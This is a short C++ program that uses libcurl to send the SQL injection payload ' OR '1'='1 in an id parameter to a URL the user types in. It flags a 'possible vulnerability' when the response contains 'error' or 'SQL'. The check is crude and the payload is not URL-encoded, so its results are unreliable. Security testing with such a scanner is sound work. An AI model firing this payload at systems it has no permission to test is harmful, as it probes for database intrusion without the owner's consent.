#include <iostream>
#include <string>
#include <curl/curl.h>

// Function to handle the response from the server
size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

bool testSQLInjection(const std::string& url) {
    std::string payload = "' OR '1'='1"; // Basic payload
    std::string testUrl = url + "?id=" + payload;

    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, testUrl.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);

        // Check for indicative responses (simplified)
        if (readBuffer.find("error") != std::string::npos || readBuffer.find("SQL") != std::string::npos) {
            return true; // Possible vulnerability
        }
    }
    return false; // No vulnerability detected
}

int main() {
    std::string url;
    std::cout << "Enter the URL to test for SQL injection (e.g., http://example.com/vuln): ";
    std::cin >> url;

    if (testSQLInjection(url)) {
        std::cout << "Possible SQL Injection vulnerability found!" << std::endl;
    } else {
        std::cout << "No vulnerabilities detected." << std::endl;
    }
    return 0;
}
